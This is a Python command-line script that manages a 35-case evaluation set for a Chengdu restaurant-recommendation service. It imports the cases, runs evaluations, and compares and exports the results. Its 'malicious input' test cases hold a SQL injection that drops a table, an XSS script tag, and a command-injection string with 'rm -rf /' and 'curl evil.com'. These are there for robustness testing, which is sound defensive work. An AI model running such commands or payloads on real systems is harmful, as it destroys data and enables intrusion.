#!/usr/bin/env python3
"""
探店推荐评测 — 可重复运行测试脚本 (v2.0)
==================================================
功能：
  1. 导入标准测试集（支持重复导入不产生重复案例）
  2. 执行评测运行
  3. 查看运行结果
  4. 比较两次运行
  5. 导出评测报告

用法：
  # 推荐方式：通过 SQL 种子文件导入（幂等）
  psql -h <host> -U <user> -d <dbname> \
    -f scripts/postgres/seed/recommendation_eval_seed.sql

  # 备选方式：通过 API 自动创建
  python scripts/run_recommendation_eval.py import --auto-create

  # 执行评测
  python scripts/run_recommendation_eval.py run --dataset-id 1

  # 查看评测结果
  python scripts/run_recommendation_eval.py results --run-id <RUN_ID>

  # 比较两次运行
  python scripts/run_recommendation_eval.py compare --baseline <ID> --candidate <ID>

  # 查看测试集统计
  python scripts/run_recommendation_eval.py stats --dataset-id 1

  # 导出评测报告为JSON
  python scripts/run_recommendation_eval.py export --run-id <RUN_ID> --output report.json

测试集版本: 2.0.0 (基于成都24家种子商户)
环境变量:
  EVAL_BASE_URL    — 后端 API 地址（默认 http://localhost:8080）
  EVAL_TOKEN       — 管理员 Session Cookie
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone, timedelta

# ---------------------------------------------------------------------------
# 配置
# ---------------------------------------------------------------------------

BASE_URL = os.environ.get("EVAL_BASE_URL", "http://localhost:8080")
API_PREFIX = f"{BASE_URL}/api/admin/recommendation-evaluations"
TOKEN = os.environ.get("EVAL_TOKEN", "")

TZ_BEIJING = timezone(timedelta(hours=8))

# 成都市中心坐标
CD_LAT = 30.575
CD_LNG = 104.065

# 各城区坐标
DISTRICTS = {
    "锦江区": (30.650, 104.080, "CD-JJ"),
    "青羊区": (30.675, 104.060, "CD-QY"),
    "武侯区": (30.630, 104.040, "CD-WH"),
    "成华区": (30.670, 104.110, "CD-CH"),
    "金牛区": (30.700, 104.055, "CD-JN"),
    "高新区": (30.560, 104.070, "CD-GX"),
}


def cd_location(region=None):
    """构造成都坐标快照。"""
    if region and region in DISTRICTS:
        lat, lng, code = DISTRICTS[region]
        return {
            "latitude": lat, "longitude": lng,
            "region": f"成都市{region}", "region_code": code,
        }
    return {
        "latitude": CD_LAT, "longitude": CD_LNG,
        "region": "成都市", "region_code": "CD",
    }


# ---------------------------------------------------------------------------
# HTTP 工具
# ---------------------------------------------------------------------------

def _request(method, path, body=None):
    url = f"{API_PREFIX}{path}"
    headers = {"Content-Type": "application/json"}
    if TOKEN:
        headers["Cookie"] = f"SESSION={TOKEN}"
    data_bytes = None
    if body is not None:
        data_bytes = json.dumps(body, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data_bytes, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return e.code, {"error": e.read().decode("utf-8", errors="replace")}
    except urllib.error.URLError as e:
        return 0, {"error": str(e.reason)}


def _get(path):
    return _request("GET", path)


def _post(path, body=None):
    return _request("POST", path, body)


# ---------------------------------------------------------------------------
# 案例定义 (v2.0 — 成都本地化)
# ---------------------------------------------------------------------------

def _case(code, name, text, constraints, region=None, tags=None, seq=0):
    """构造一条测试案例的 API payload。"""
    return {
        "case_code": code,
        "case_name": name,
        "api_payload": {
            "caseCode": code,
            "caseName": name,
            "inputText": text,
            "expectedConstraints": constraints,
            "locationSnapshot": cd_location(region),
            "tags": tags or [],
            "sequenceNo": seq,
        },
    }


def _load_case_definitions():
    """返回 v2.0 成都本地化测试案例定义列表。"""
    C = cd_location()  # 成都默认坐标快照

    cases = [
        # ==================== 普通问题 (12) ====================
        _case("REC-001", "单人川菜成华区",
              "我一个人想吃川菜，人均50以内，最好在成华区",
              {"cuisines": ["川菜"], "partySize": 1, "perCapitaBudget": 50, "distanceKm": 5},
              "成华区", ["normal", "cuisine", "budget", "region", "single"], 1),

        _case("REC-002", "双人火锅高评分",
              "两个人想吃火锅，评分要高的，人均不超过80",
              {"cuisines": ["火锅"], "partySize": 2, "perCapitaBudget": 80, "minRating": 4.0},
              None, ["normal", "cuisine", "budget", "rating", "couple"], 2),

        _case("REC-003", "家庭聚餐粤菜",
              "一家四口想吃粤菜，人均80到120，适合家庭聚餐的",
              {"cuisines": ["粤菜"], "partySize": 4, "perCapitaBudget": 100, "scenes": ["家庭聚餐"]},
              None, ["normal", "cuisine", "budget", "scene", "family"], 3),

        _case("REC-004", "朋友下午茶咖啡甜品",
              "和朋友去喝下午茶，找一家咖啡甜品店，环境安静一点的",
              {"cuisines": ["咖啡甜品"], "partySize": 3, "environmentRequirements": ["安静"], "scenes": ["朋友聚会"]},
              None, ["normal", "cuisine", "environment", "scene", "friends"], 4),

        _case("REC-005", "锦江区火锅",
              "锦江区有什么好吃的火锅店？人均70左右",
              {"cuisines": ["火锅"], "perCapitaBudget": 70},
              "锦江区", ["normal", "cuisine", "region", "budget"], 5),

        _case("REC-006", "武侯区中餐高评分",
              "武侯区附近有什么好的中餐馆？评分3.0以上的",
              {"merchantTypes": ["中餐"], "minRating": 3.0},
              "武侯区", ["normal", "category", "rating", "region"], 6),

        _case("REC-007", "金牛区人均80以内",
              "金牛区附近，人均不超过80块钱，随便什么菜系都行",
              {"perCapitaBudget": 80, "distanceKm": 5},
              "金牛区", ["normal", "budget", "region"], 7),

        _case("REC-008", "成华区明亮环境",
              "成华区有没有环境比较明亮的餐厅？两个人吃",
              {"partySize": 2, "environmentRequirements": ["明亮"], "distanceKm": 5},
              "成华区", ["normal", "environment", "region", "couple"], 8),

        _case("REC-009", "青羊区聚餐",
              "五六个人想在青羊区聚餐，环境要适合聚餐的",
              {"partySize": 5, "environmentRequirements": ["适合聚餐"], "scenes": ["朋友聚会"]},
              "青羊区", ["normal", "environment", "region", "scene", "group"], 9),

        _case("REC-010", "高评分川菜",
              "想吃评分最高的川菜馆，两个人",
              {"cuisines": ["川菜"], "partySize": 2, "minRating": 3.5},
              None, ["normal", "cuisine", "rating", "couple"], 10),

        _case("REC-011", "火锅安静环境",
              "想吃火锅，环境要安静一点的，三个人，人均100以内",
              {"cuisines": ["火锅"], "partySize": 3, "perCapitaBudget": 100, "environmentRequirements": ["安静"]},
              None, ["normal", "cuisine", "environment", "budget"], 11),

        _case("REC-012", "高新区中餐",
              "去高新区办事，附近有什么中餐推荐？一个人吃工作餐，人均60以内",
              {"merchantTypes": ["中餐"], "partySize": 1, "perCapitaBudget": 60},
              "高新区", ["normal", "category", "budget", "region", "work_meal"], 12),

        # ==================== 模糊问题 (6) ====================
        _case("REC-013", "随便吃点",
              "随便吃点，你推荐一下吧",
              {"scenes": ["随意用餐"]},
              None, ["fuzzy", "vague", "no_constraints"], 13),

        _case("REC-014", "成都好吃的",
              "成都有什么好吃的餐厅推荐吗",
              {"minRating": 3.5},
              None, ["fuzzy", "subjective", "general"], 14),

        _case("REC-015", "不太贵的",
              "想吃不太贵的，两个人",
              {"partySize": 2, "perCapitaBudget": 80},
              None, ["fuzzy", "budget", "vague"], 15),

        _case("REC-016", "附近有什么",
              "我附近有什么好吃的？",
              {"distanceKm": 5, "minRating": 3.0},
              "成华区", ["fuzzy", "distance", "location_based"], 16),

        _case("REC-017", "环境好一点",
              "有没有环境好一点的餐厅？两三个人",
              {"partySize": 2, "environmentRequirements": ["安静"], "minRating": 3.5},
              None, ["fuzzy", "environment", "vague"], 17),

        _case("REC-018", "适合约会的",
              "推荐个适合约会的餐厅，成都市区",
              {"partySize": 2, "environmentRequirements": ["安静"], "scenes": ["约会"],
               "perCapitaBudget": 80, "minRating": 3.5},
              None, ["fuzzy", "scene", "subjective", "couple"], 18),

        # ==================== 条件冲突 (6) ====================
        _case("REC-019", "素食火锅",
              "想吃素食火锅，两个人",
              {"cuisines": ["火锅"], "tasteRestrictions": ["素食"], "partySize": 2},
              None, ["conflict", "cuisine", "taste", "contradiction"], 19),

        _case("REC-020", "安静又热闹",
              "想找一家环境既安静又热闹的餐厅，一个人",
              {"partySize": 1, "environmentRequirements": ["安静", "热闹"]},
              None, ["conflict", "environment", "contradiction"], 20),

        _case("REC-021", "火锅不辣",
              "想吃火锅但是一点辣都不能吃，有这种店吗",
              {"cuisines": ["火锅"], "tasteRestrictions": ["不吃辣"]},
              None, ["conflict", "cuisine", "taste", "contradiction"], 21),

        _case("REC-022", "单人商务宴请",
              "我一个人要商务宴请，人均200以上",
              {"partySize": 1, "scenes": ["商务宴请"], "perCapitaBudget": 200},
              None, ["conflict", "scene", "party_size", "contradiction"], 22),

        _case("REC-023", "凌晨吃早餐",
              "凌晨2点想吃早餐，有油条豆浆那种",
              {"merchantTypes": ["早餐"], "businessTime": "LATE_NIGHT", "businessTargetTime": "02:00"},
              None, ["conflict", "business_hours", "category", "contradiction"], 23),

        _case("REC-024", "免费高档餐厅",
              "有没有免费的高档餐厅，评分还要4.5以上的",
              {"perCapitaBudget": 0, "minRating": 4.5},
              None, ["conflict", "budget", "rating", "contradiction"], 24),

        # ==================== 无结果 (6) ====================
        _case("REC-025", "日料推荐",
              "想吃日料，人均100左右，两个人",
              {"cuisines": ["日料"], "partySize": 2, "perCapitaBudget": 100},
              None, ["no_result", "cuisine", "nonexistent", "empty"], 25),

        _case("REC-026", "人均200川菜",
              "想吃川菜，人均200以上，要高档的",
              {"cuisines": ["川菜"], "perCapitaBudget": 200},
              None, ["no_result", "budget", "exceeds_max", "empty"], 26),

        _case("REC-027", "评分4.8火锅",
              "想吃评分4.8以上的火锅，人均不限",
              {"cuisines": ["火锅"], "minRating": 4.8},
              None, ["no_result", "rating", "exceeds_max", "empty"], 27),

        _case("REC-028", "凌晨火锅",
              "凌晨2点想吃火锅，成都市区",
              {"cuisines": ["火锅"], "businessTime": "LATE_NIGHT", "businessTargetTime": "02:00"},
              None, ["no_result", "business_hours", "late_night", "empty"], 28),

        _case("REC-029", "武侯区粤菜已停业",
              "武侯区有没有粤菜馆？",
              {"cuisines": ["粤菜"]},
              "武侯区", ["no_result", "operation_status", "suspended", "empty"], 29),

        _case("REC-030", "交通便利火锅",
              "想吃火锅，要交通便利的那种，一个人",
              {"cuisines": ["火锅"], "partySize": 1, "environmentRequirements": ["交通便利"]},
              None, ["no_result", "cuisine", "environment", "cross_filter", "empty"], 30),

        # ==================== 恶意输入 (5) ====================
        _case("REC-031", "SQL注入攻击",
              "川菜; DROP TABLE merchants; --",
              {"cuisines": ["川菜"]},
              None, ["malicious", "sql_injection", "security"], 31),

        _case("REC-032", "XSS攻击",
              "<script>alert(\"xss\")</script>火锅推荐",
              {"cuisines": ["火锅"]},
              None, ["malicious", "xss", "security"], 32),

        _case("REC-033", "超长输入",
              "我想吃" + "川菜" * 100,
              {"cuisines": ["川菜"]},
              None, ["malicious", "long_input", "robustness"], 33),

        _case("REC-034", "特殊Unicode字符",
              "想吃🍲🌶️ 火锅 ​ 人均80",
              {"cuisines": ["火锅"], "perCapitaBudget": 80},
              None, ["malicious", "unicode", "emoji", "robustness"], 34),

        _case("REC-035", "命令注入",
              "川菜 $(rm -rf /) 或者 && curl evil.com 人均50",
              {"cuisines": ["川菜"], "perCapitaBudget": 50},
              None, ["malicious", "command_injection", "security"], 35),
    ]
    return cases


# ---------------------------------------------------------------------------
# 命令实现
# ---------------------------------------------------------------------------

def cmd_import(args):
    """导入测试集（幂等）。"""
    print("=" * 60)
    print("  探店推荐标准测试集 v2.0 — 导入指引")
    print("=" * 60)
    print()
    print("  推荐方式：通过 SQL 种子文件导入（幂等）")
    print("    psql -h <host> -U <user> -d <dbname> \\")
    print("      -f scripts/postgres/seed/recommendation_eval_seed.sql")
    print()
    print("  数据概要：")
    print("    - 基于成都24家种子商户（6区 × 4菜系）")
    print("    - 价格区间 32-124元，评分 2.0-4.0")
    print("    - 环境标签：川菜&粤菜→[明亮,交通便利]，火锅&咖啡甜品→[安静,适合聚餐]")
    print("    - 35条案例：普通12 + 模糊6 + 冲突6 + 无结果6 + 恶意5")
    print()

    if args.auto_create:
        _auto_create_dataset_and_cases()


def _auto_create_dataset_and_cases():
    """通过 API 自动创建测试集和案例。"""
    print("[INFO] 检查已有测试集...")
    status, data = _get("/datasets?pageNum=1&pageSize=50")
    if status != 200:
        print(f"[ERROR] 无法访问评测 API: {data}")
        sys.exit(1)

    existing = data.get("data", {}).get("records", [])
    dataset_id = None
    for ds in existing:
        if ds.get("dataVersion") == "2.0.0":
            dataset_id = ds["id"]
            print(f"[INFO] 测试集已存在: dataset_id={dataset_id}")
            break

    if dataset_id is None:
        print("[INFO] 创建测试集 v2.0...")
        status, data = _post("/datasets", {
            "name": "探店推荐标准测试集 v2.0",
            "description": (
                "基于成都24家种子商户的探店推荐评测集。"
                "商户构成：6个区 × 4种菜系(川菜/火锅/粤菜/咖啡甜品)。"
                "包含普通问题(12)、模糊问题(6)、条件冲突(6)、无结果(6)、恶意输入(5)共35条案例。"
            ),
            "dataVersion": "2.0.0",
            "status": "ACTIVE",
        })
        if status != 200:
            print(f"[ERROR] 创建测试集失败: {data}")
            sys.exit(1)
        dataset_id = data["data"]["id"]
        print(f"[INFO] 测试集已创建: dataset_id={dataset_id}")

    cases = _load_case_definitions()

    print(f"[INFO] 检查已有案例...")
    status, existing_cases = _get(f"/datasets/{dataset_id}/cases")
    if status != 200:
        print(f"[ERROR] 获取案例列表失败: {existing_cases}")
        sys.exit(1)

    existing_codes = {
        c["caseCode"] for c in (existing_cases.get("data", []) or [])
    }

    created = 0
    skipped = 0
    for case in cases:
        if case["case_code"] in existing_codes:
            skipped += 1
            continue
        status, resp = _post(
            f"/datasets/{dataset_id}/cases", case["api_payload"]
        )
        if status == 200:
            created += 1
            print(f"  [OK] {case['case_code']}: {case['case_name']}")
        else:
            print(f"  [FAIL] {case['case_code']}: {resp}")

    print()
    print(f"[DONE] 导入完成: 新建 {created} 条, 跳过(已存在) {skipped} 条")


def cmd_run(args):
    """执行一次评测运行。"""
    dataset_id = args.dataset_id
    top_k = args.top_k or 10

    print(f"[INFO] 对测试集 dataset_id={dataset_id} 发起评测运行 (topK={top_k})...")

    status, data = _post(
        f"/datasets/{dataset_id}/runs",
        {"topK": top_k},
    )

    if status != 200:
        print(f"[ERROR] 执行评测失败: {data}")
        sys.exit(1)

    run_info = data.get("data", data)
    run_id = run_info.get("id")
    run_status = run_info.get("status")

    print(f"[INFO] 运行已创建: run_id={run_id}, status={run_status}")

    print("[INFO] 等待评测完成...", end="", flush=True)
    max_wait = 300
    waited = 0
    while run_status in ("PENDING", "RUNNING") and waited < max_wait:
        time.sleep(2)
        waited += 2
        print(".", end="", flush=True)
        s, d = _get(f"/runs/{run_id}")
        if s == 200:
            run_status = d.get("data", d).get("status", run_status)

    print()
    if run_status in ("COMPLETED", "PARTIAL", "FAILED"):
        _print_run_summary(run_id)
    else:
        print(f"[WARN] 评测可能仍在执行中，当前状态: {run_status}")
        print(f"       请稍后使用 'results --run-id {run_id}' 查看结果")


def cmd_results(args):
    """查看评测运行结果。"""
    run_id = args.run_id
    _print_run_summary(run_id)

    print()
    print("─" * 90)

    status, data = _get(f"/runs/{run_id}/results")
    if status != 200:
        print(f"[ERROR] 获取结果失败: {data}")
        return

    results = data.get("data", []) or []
    if not results:
        print("(无案例结果)")
        return

    tag_stats = {}
    for r in results:
        case_status = r.get("status", "UNKNOWN")
        tag_stats[case_status] = tag_stats.get(case_status, 0) + 1

    print(f"{'结果ID':<8} {'案例ID':<8} {'状态':<10} {'结果数':<8} {'耗时ms':<10} {'约束准确率':<12}")
    print("─" * 90)

    for r in results:
        rid = r.get("id", "?")
        cid = r.get("caseId", "?")
        status_s = r.get("status", "?")
        count = r.get("resultCount", 0)
        duration = r.get("durationMs", 0)
        metrics_str = r.get("hardConditionMetrics", "{}")
        try:
            metrics = json.loads(metrics_str) if isinstance(metrics_str, str) else metrics_str
        except json.JSONDecodeError:
            metrics = {}
        accuracy = metrics.get("constraintAccuracy", "N/A")

        print(f"{rid:<8} {cid:<8} {status_s:<10} {count:<8} {duration:<10} {str(accuracy):<12}")

    print("─" * 90)
    print(f"共 {len(results)} 条案例结果")
    for tag, cnt in sorted(tag_stats.items()):
        print(f"  {tag}: {cnt}")


def cmd_compare(args):
    """比较两次评测运行。"""
    print(f"[INFO] 比较运行 baseline={args.baseline} vs candidate={args.candidate}")
    status, data = _get(
        f"/runs/compare?baselineRunId={args.baseline}&candidateRunId={args.candidate}"
    )
    if status != 200:
        print(f"[ERROR] 比较失败: {data}")
        sys.exit(1)

    comp = data.get("data", data)
    metric = comp.get("metricComparison", {})

    print()
    print("=" * 60)
    print("  评测运行对比报告")
    print("=" * 60)
    print(f"  基准运行 ID: {comp.get('baselineRunId')}")
    print(f"  候选运行 ID: {comp.get('candidateRunId')}")
    print()

    def _show(label, base, cand, delta):
        arrow = "↑" if (delta or 0) > 0 else ("↓" if (delta or 0) < 0 else "─")
        print(f"  {label:<24} {str(base):<10} → {str(cand):<10} {arrow} {delta:+}")

    _show("约束准确率", metric.get("baselineOverallAccuracy"),
          metric.get("candidateOverallAccuracy"), metric.get("accuracyChange"))
    _show("完全匹配数", metric.get("baselineExactMatchCount"),
          metric.get("candidateExactMatchCount"), metric.get("exactMatchChange"))
    _show("失败案例数", metric.get("baselineFailedCount"),
          metric.get("candidateFailedCount"), metric.get("failedChange"))
    _show("无结果案例数", metric.get("baselineNoResultCount"),
          metric.get("candidateNoResultCount"), metric.get("noResultChange"))
    _show("推荐总数", metric.get("baselineTotalReturned"),
          metric.get("candidateTotalReturned"), metric.get("returnedChange"))
    _show("独立商家数", metric.get("baselineUniqueMerchantCount"),
          metric.get("candidateUniqueMerchantCount"), metric.get("uniqueMerchantChange"))

    improved = comp.get("improvedCaseIds", []) or []
    regressed = comp.get("regressedCaseIds", []) or []
    print()
    print(f"  📈 提升案例: {len(improved)} 个")
    print(f"  📉 退步案例: {len(regressed)} 个")


def cmd_stats(args):
    """查看测试集统计信息。"""
    dataset_id = args.dataset_id

    status, data = _get(f"/datasets/{dataset_id}")
    if status != 200:
        print(f"[ERROR] 获取测试集失败: {data}")
        sys.exit(1)

    ds = data.get("data", data)
    print("=" * 60)
    print("  测试集统计信息")
    print("=" * 60)
    print(f"  名称: {ds.get('name')}")
    print(f"  版本: {ds.get('dataVersion')}")
    print(f"  状态: {ds.get('status')}")
    print()

    status, cases_resp = _get(f"/datasets/{dataset_id}/cases")
    if status != 200:
        print("[ERROR] 获取案例失败")
        return

    cases = cases_resp.get("data", []) or []
    total = len(cases)
    enabled = sum(1 for c in cases if c.get("enabled"))

    tag_counts = {}
    for c in cases:
        for tag in (c.get("tags") or []):
            tag_counts[tag] = tag_counts.get(tag, 0) + 1

    category_map = {
        "normal": "普通问题", "fuzzy": "模糊问题",
        "conflict": "条件冲突", "no_result": "无结果",
        "malicious": "恶意输入",
    }
    print(f"  总案例数: {total} (启用: {enabled})")
    print()
    print("  按类别分布:")
    for tag_key, label in category_map.items():
        cnt = tag_counts.get(tag_key, 0)
        bar = "█" * cnt
        print(f"    {label:<12} {cnt:>3} {bar}")

    print()
    print("  按维度分布:")
    for dt in ["cuisine", "budget", "region", "rating", "environment",
               "scene", "business_hours", "security", "robustness"]:
        cnt = tag_counts.get(dt, 0)
        if cnt > 0:
            print(f"    {dt:<20} {cnt:>3}")

    status, runs_resp = _get(f"/datasets/{dataset_id}/runs")
    if status == 200:
        runs = runs_resp.get("data", []) or []
        print()
        print(f"  历史评测运行: {len(runs)} 次")
        for r in runs[:5]:
            print(f"    run_id={r['id']}  {r['status']}  "
                  f"成功{r.get('successCount',0)}/失败{r.get('failedCount',0)}")


def cmd_export(args):
    """导出评测报告为 JSON。"""
    run_id = args.run_id

    _, run_data = _get(f"/runs/{run_id}")
    run_info = run_data.get("data", run_data) if run_data else {}

    _, results_data = _get(f"/runs/{run_id}/results")
    results = results_data.get("data", []) if results_data else []

    report = {
        "export_time": datetime.now(TZ_BEIJING).isoformat(),
        "data_version": "2.0.0",
        "run": {
            "id": run_info.get("id"),
            "status": run_info.get("status"),
            "algorithm_version": run_info.get("algorithmVersion"),
            "metrics": run_info.get("metrics"),
        },
        "case_results": [],
    }

    for r in results:
        report["case_results"].append({
            "case_result_id": r.get("id"),
            "case_id": r.get("caseId"),
            "status": r.get("status"),
            "result_count": r.get("resultCount"),
            "duration_ms": r.get("durationMs"),
            "hard_condition_metrics": r.get("hardConditionMetrics"),
            "failure_reasons": r.get("failureReasons"),
            "relevance_label": r.get("relevanceLabel"),
        })

    output_path = args.output or f"eval_report_run{run_id}.json"
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)

    print(f"[OK] 评测报告已导出到: {output_path}")
    print(f"     包含 1 次运行、{len(results)} 条案例结果")


def _print_run_summary(run_id):
    """打印单次运行的汇总信息。"""
    status, data = _get(f"/runs/{run_id}")
    if status != 200:
        print(f"[ERROR] 获取运行信息失败: {data}")
        return

    run = data.get("data", data)
    metrics_str = run.get("metrics", "{}")
    try:
        metrics = json.loads(metrics_str) if isinstance(metrics_str, str) else metrics_str
    except json.JSONDecodeError:
        metrics = {}

    print()
    print("=" * 60)
    print("  评测运行报告")
    print("=" * 60)
    print(f"  运行 ID:      {run.get('id')}")
    print(f"  状态:         {run.get('status')}")
    print(f"  算法版本:     {run.get('algorithmVersion')}")
    print(f"  数据版本:     {run.get('dataVersion')}")
    print(f"  请求案例数:   {run.get('requestedCount')}")
    print(f"  成功:         {run.get('successCount')}")
    print(f"  失败:         {run.get('failedCount')}")
    print()
    print(f"  ── 指标 ──")
    print(f"  约束准确率:         {metrics.get('overallConstraintAccuracy', 'N/A')}")
    print(f"  完全约束匹配案例数: {metrics.get('exactConstraintMatchCaseCount', 'N/A')}")
    print(f"  无结果案例数:       {metrics.get('noResultCaseCount', 'N/A')}")
    print(f"  返回推荐总数:       {metrics.get('totalReturnedRecommendations', 'N/A')}")
    print(f"  独立商家数:         {metrics.get('uniqueMerchantCount', 'N/A')}")
    print()

    error_msg = run.get("errorMessage")
    if error_msg:
        print(f"  ⚠ 错误信息: {error_msg}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="探店推荐评测测试集管理脚本 (v2.0 成都本地化)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python run_recommendation_eval.py import --auto-create
  python run_recommendation_eval.py run --dataset-id 1
  python run_recommendation_eval.py results --run-id 5
  python run_recommendation_eval.py compare --baseline 1 --candidate 2
  python run_recommendation_eval.py stats --dataset-id 1
  python run_recommendation_eval.py export --run-id 5 --output report.json
        """,
    )

    sub = parser.add_subparsers(dest="command", help="子命令")

    p_import = sub.add_parser("import", help="导入标准测试集（幂等）")
    p_import.add_argument("--auto-create", action="store_true",
                          help="通过 API 自动创建测试集和案例")

    p_run = sub.add_parser("run", help="执行评测运行")
    p_run.add_argument("--dataset-id", type=int, required=True, help="测试集 ID")
    p_run.add_argument("--top-k", type=int, default=10, help="每案例返回 Top-K (默认10)")

    p_results = sub.add_parser("results", help="查看运行结果")
    p_results.add_argument("--run-id", type=int, required=True, help="运行 ID")

    p_compare = sub.add_parser("compare", help="比较两次评测运行")
    p_compare.add_argument("--baseline", type=int, required=True, help="基准运行 ID")
    p_compare.add_argument("--candidate", type=int, required=True, help="候选运行 ID")

    p_stats = sub.add_parser("stats", help="查看测试集统计信息")
    p_stats.add_argument("--dataset-id", type=int, required=True, help="测试集 ID")

    p_export = sub.add_parser("export", help="导出评测报告为JSON")
    p_export.add_argument("--run-id", type=int, required=True, help="运行 ID")
    p_export.add_argument("--output", type=str, default=None, help="输出文件路径")

    args = parser.parse_args()

    if args.command == "import":
        cmd_import(args)
    elif args.command == "run":
        cmd_run(args)
    elif args.command == "results":
        cmd_results(args)
    elif args.command == "compare":
        cmd_compare(args)
    elif args.command == "stats":
        cmd_stats(args)
    elif args.command == "export":
        cmd_export(args)
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
